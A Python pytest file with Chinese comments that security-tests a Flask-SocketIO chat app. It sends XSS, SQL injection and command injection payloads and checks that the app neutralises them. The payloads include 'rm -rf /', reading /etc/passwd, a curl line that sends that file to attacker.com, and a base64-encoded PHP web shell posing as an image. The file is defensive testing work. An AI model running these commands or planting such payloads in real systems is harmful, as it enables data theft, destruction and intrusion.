# test_security.py - 安全测试
import pytest
import requests
import base64
import json
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

class TestInputValidationSecurity:
    """输入验证安全测试"""
    
    def test_xss_in_username(self):
        """测试用户名XSS攻击防护"""
        from app import app, socketio
        
        client = socketio.test_client(app)
        
        # XSS攻击载荷
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
        ]
        
        for payload in xss_payloads:
            try:
                client.emit('join', {
                    'username': payload,
                    'room': 'general'
                })
                
                received = client.get_received()
                
                # 验证payload被安全处理（转义或过滤）
                for event in received:
                    if 'args' in event and len(event['args']) > 0:
                        message_content = str(event['args'][0])
                        # 确保恶意脚本没有原样出现
                        assert '<script>' not in message_content.lower()
                        assert 'javascript:' not in message_content.lower()
                        assert 'onerror=' not in message_content.lower()
                
            except Exception as e:
                # 如果抛出异常，说明输入验证起作用了
                print(f"输入验证阻止了XSS攻击: {payload}")
    
    def test_xss_in_message_content(self):
        """测试消息内容XSS攻击防护"""
        from app import app, socketio
        
        client = socketio.test_client(app)
        
        # 先正常加入聊天
        client.emit('join', {
            'username': '安全测试用户',
            'room': 'general'
        })
        client.get_received()  # 清空缓冲区
        
        # XSS攻击载荷
        xss_payloads = [
            "<script>alert('XSS in message')</script>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='javascript:alert(\"XSS\")'></object>",
            "<embed src='javascript:alert(\"XSS\")'></embed>",
            "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>"
        ]
        
        for payload in xss_payloads:
            client.emit('send_message', {
                'message': payload,
                'type': 'text'
            })
            
            received = client.get_received()
            
            # 验证payload被安全处理
            for event in received:
                if event.get('name') == 'receive_message':
                    message = event['args'][0]['message']
                    # 确保恶意脚本被转义或移除
                    assert '<script>' not in message.lower()
                    assert 'javascript:' not in message.lower()
    
    def test_sql_injection_attempts(self):
        """测试SQL注入攻击防护"""
        from app import app, socketio
        
        client = socketio.test_client(app)
        
        # SQL注入载荷
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "'; UPDATE users SET password='hacked'--"
        ]
        
        for payload in sql_payloads:
            try:
                client.emit('join', {
                    'username': payload,
                    'room': 'general'
                })
                
                # 如果应用使用数据库，这里应该验证数据库没有被影响
                # 由于当前应用使用内存存储，主要验证不会导致异常
                received = client.get_received()
                
            except Exception as e:
                print(f"SQL注入尝试被阻止: {payload}")
    
    def test_command_injection(self):
        """测试命令注入攻击防护"""
        from app import app, socketio
        
        client = socketio.test_client(app)
        
        # 命令注入载荷
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; curl attacker.com/steal?data=$(cat /etc/passwd)"
        ]
        
        client.emit('join', {
            'username': '命令注入测试',
            'room': 'general'
        })
        client.get_received()
        
        for payload in command_payloads:
            client.emit('send_message', {
                'message': payload,
                'type': 'text'
            })
            
            # 验证命令没有被执行
            received = client.get_received()
            
            # 命令注入通常不会在消息内容中直接体现
            # 主要确保应用仍然正常工作
            assert len(received) > 0  # 应该有消息返回

class TestFileUploadSecurity:
    """文件上传安全测试"""
    
    def test_malicious_image_upload(self):
        """测试恶意图片上传防护"""
        from app import validate_image_data
        
        # 测试各种恶意文件类型
        malicious_files = [
            # PHP脚本伪装成图片
            "data:image/jpeg;base64," + base64.b64encode(b"<?php system($_GET['cmd']); ?>").decode(),
            
            # JavaScript伪装成图片  
            "data:image/png;base64," + base64.b64encode(b"<script>alert('XSS')</script>").decode(),
            
            # HTML文件
            "data:image/gif;base64," + base64.b64encode(b"<html><body>malicious</body></html>").decode(),
            
            # 可执行文件
            "data:image/jpg;base64," + base64.b64encode(b"\x4d\x5a\x90\x00").decode(),  # PE文件头
        ]
        
        for malicious_file in malicious_files:
            result = validate_image_data(malicious_file)
            assert result == False, f"恶意文件应该被拒绝: {malicious_file[:50]}..."
    
    def test_oversized_file_upload(self):
        """测试超大文件上传防护"""
        from app import validate_image_data
        
        # 创建超大文件（超过100MB限制）
        large_data = "A" * (150 * 1024 * 1024)  # 150MB
        oversized_file = f"data:image/jpeg;base64,{large_data}"
        
        result = validate_image_data(oversized_file)
        assert result == False, "超大文件应该被拒绝"
    
    def test_invalid_image_format(self):
        """测试无效图片格式"""
        from app import validate_image_data
        
        invalid_formats = [
            "data:text/plain;base64,SGVsbG8gV29ybGQ=",  # 文本文件
            "data:application/pdf;base64,JVBERi0xLjQ=",   # PDF文件
            "data:video/mp4;base64,AAAAIGZ0eXBpc29t",     # 视频文件
            "invalid_format_string",                       # 完全无效的格式
        ]
        
        for invalid_format in invalid_formats:
            result = validate_image_data(invalid_format)
            assert result == False, f"无效格式应该被拒绝: {invalid_format}"

class TestBrowserSecurity:
    """浏览器安全测试"""
    
    @pytest.fixture
    def driver(self):
        """创建浏览器驱动"""
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        
        driver = webdriver.Chrome(options=options)
        driver.implicitly_wait(10)
        
        yield driver
        
        driver.quit()
    
    def test_content_security_policy(self, driver):
        """测试内容安全策略"""
        driver.get("http://localhost:5000")
        
        # 检查CSP头
        # 注意：Selenium无法直接获取HTTP头，这里检查页面行为
        
        # 尝试执行内联脚本（应该被CSP阻止）
        try:
            driver.execute_script("alert('This should be blocked by CSP')")
            # 如果能执行，说明CSP配置可能有问题
        except Exception:
            # 被阻止是正常的
            pass
    
    def test_clickjacking_protection(self, driver):
        """测试点击劫持防护"""
        driver.get("http://localhost:5000")
        
        # 检查X-Frame-Options或frame-ancestors
        # 这里主要验证页面在iframe中的行为
        iframe_html = f"""
        <html>
        <body>
        <iframe src="http://localhost:5000" width="800" height="600"></iframe>
        </body>
        </html>
        """
        
        # 创建包含iframe的页面
        with open("test_iframe.html", "w") as f:
            f.write(iframe_html)
        
        try:
            driver.get(f"file://{os.path.abspath('test_iframe.html')}")
            
            # 检查iframe是否被阻止加载
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            
            if iframes:
                # 检查iframe内容是否正常加载
                driver.switch_to.frame(iframes[0])
                try:
                    driver.find_element(By.ID, "usernameInput")
                    # 如果能找到元素，说明iframe加载成功
                    # 这可能表示缺少点击劫持防护
                    print("警告: 页面可能缺少点击劫持防护")
                except:
                    # 无法找到元素，可能被阻止了
                    print("点击劫持防护正常工作")
                finally:
                    driver.switch_to.default_content()
        
        finally:
            # 清理测试文件
            if os.path.exists("test_iframe.html"):
                os.remove("test_iframe.html")
    
    def test_mixed_content_security(self, driver):
        """测试混合内容安全"""
        driver.get("http://localhost:5000")
        
        # 检查是否有混合内容（HTTPS页面加载HTTP资源）
        # 获取页面中的所有链接和资源
        links = driver.find_elements(By.TAG_NAME, "link")
        scripts = driver.find_elements(By.TAG_NAME, "script")
        images = driver.find_elements(By.TAG_NAME, "img")
        
        for element in links + scripts + images:
            src = element.get_attribute("src") or element.get_attribute("href")
            if src and src.startswith("http://"):
                print(f"发现非安全资源: {src}")

class TestAuthenticationSecurity:
    """认证安全测试"""
    
    def test_session_management(self):
        """测试会话管理安全"""
        from app import app, socketio
        
        # 测试多个客户端使用相同用户名
        client1 = socketio.test_client(app)
        client2 = socketio.test_client(app)
        
        # 两个客户端使用相同用户名
        client1.emit('join', {'username': '重复用户', 'room': 'general'})
        client2.emit('join', {'username': '重复用户', 'room': 'general'})
        
        # 验证系统如何处理重复用户名
        # 现在的实现允许重复用户名，这可能是安全问题
        
        # 测试断开连接后的清理
        client1.disconnect()
        time.sleep(0.1)
        
        # 验证用户是否从在线列表中移除
        from app import online_users
        # 检查online_users的状态
    
    def test_rate_limiting(self):
        """测试速率限制"""
        from app import app, socketio
        
        client = socketio.test_client(app)
        client.emit('join', {'username': '速率测试', 'room': 'general'})
        client.get_received()
        
        # 快速发送大量消息
        start_time = time.time()
        message_count = 0
        
        try:
            for i in range(100):  # 尝试发送100条消息
                client.emit('send_message', {
                    'message': f'速率测试消息 {i}',
                    'type': 'text'
                })
                message_count += 1
        
        except Exception as e:
            print(f"速率限制触发: {e}")
        
        end_time = time.time()
        rate = message_count / (end_time - start_time)
        
        print(f"消息发送速率: {rate:.2f} 条/秒")
        
        # 如果速率过高且没有限制，可能存在DoS风险
        if rate > 50:  # 每秒超过50条消息
            print("警告: 缺少速率限制，可能存在DoS风险")

class TestDataIntegrity:
    """数据完整性测试"""
    
    def test_message_persistence(self):
        """测试消息持久性"""
        from app import chat_messages
        
        # 清空消息历史
        chat_messages.clear()
        
        # 添加测试消息
        test_messages = [
            {'username': 'user1', 'message': 'message1', 'type': 'text'},
            {'username': 'user2', 'message': 'message2', 'type': 'text'},
        ]
        
        for msg in test_messages:
            chat_messages.append(msg)
        
        # 验证消息完整性
        assert len(chat_messages) == 2
        assert chat_messages[0]['message'] == 'message1'
        assert chat_messages[1]['message'] == 'message2'
        
        # 测试消息限制（100条）
        for i in range(105):
            chat_messages.append({
                'username': f'user{i}',
                'message': f'message{i}',
                'type': 'text'
            })
        
        # 验证只保留100条消息
        assert len(chat_messages) == 100
    
    def test_user_data_isolation(self):
        """测试用户数据隔离"""
        from app import online_users
        
        # 清空用户列表
        online_users.clear()
        
        # 添加测试用户
        online_users['session1'] = {
            'username': 'user1',
            'user_id': 'id1',
            'room': 'room1'
        }
        
        online_users['session2'] = {
            'username': 'user2', 
            'user_id': 'id2',
            'room': 'room2'
        }
        
        # 验证用户数据隔离
        assert online_users['session1']['username'] == 'user1'
        assert online_users['session2']['username'] == 'user2'
        assert online_users['session1']['room'] != online_users['session2']['room']

# 运行安全测试
if __name__ == '__main__':
    pytest.main(['-v', __file__, '-m', 'security'])